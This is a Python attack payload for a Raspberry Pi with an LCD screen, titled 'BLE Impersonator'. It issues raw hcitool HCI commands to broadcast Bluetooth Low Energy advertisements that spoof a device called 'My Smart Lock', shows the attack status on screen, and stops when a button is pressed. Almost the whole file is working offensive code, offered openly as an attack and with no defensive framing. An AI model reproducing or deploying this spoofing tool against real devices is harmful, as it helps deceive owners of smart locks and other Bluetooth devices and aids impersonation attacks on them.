#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

TARGET_NAME = "My Smart Lock"
TARGET_AD_DATA = "0x08 0x0008 1e 02 01 06 03 03 aa fe 16 16 aa fe 10 00 03 6d 79 73 6d 61 72 74 6c 6f 63 6b 00"

PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_proc = None

def cleanup(*_):
    global running
    running = False
    if attack_proc:
        try: os.kill(attack_proc.pid, signal.SIGTERM)
        except: pass
    subprocess.run("hcitool -i hci0 cmd 0x08 0x000a 00", shell=True, capture_output=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(status: str):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "BLE Impersonator", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 40), status, font=FONT_TITLE, fill=status_color)
    d.text((5, 60), f"Spoofing:", font=FONT)
    d.text((10, 75), TARGET_NAME[:20], font=FONT, fill="yellow")
    d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def start_attack():
    global attack_proc
    try:
        cmd_data = f"hcitool -i hci0 cmd {TARGET_AD_DATA}"
        subprocess.run(cmd_data, shell=True, check=True, capture_output=True)
        cmd_adv = "hcitool -i hci0 cmd 0x08 0x000a 01"
        attack_proc = subprocess.Popen(cmd_adv, shell=True)
        return True
    except Exception as e:
        print(f"BLE Impersonation failed: {e}", file=sys.stderr)
        return False

if __name__ == "__main__":
    try:
        if subprocess.run("which hcitool", shell=True, capture_output=True).returncode != 0:
            draw_ui("hcitool not found!")
            time.sleep(3)
            raise SystemExit("`hcitool` command not found.")

        draw_ui("STARTING")
        if start_attack():
            while running:
                draw_ui("ACTIVE")
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                time.sleep(1)
        else:
            draw_ui("FAILED")
            time.sleep(3)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("BLE Impersonator payload finished.")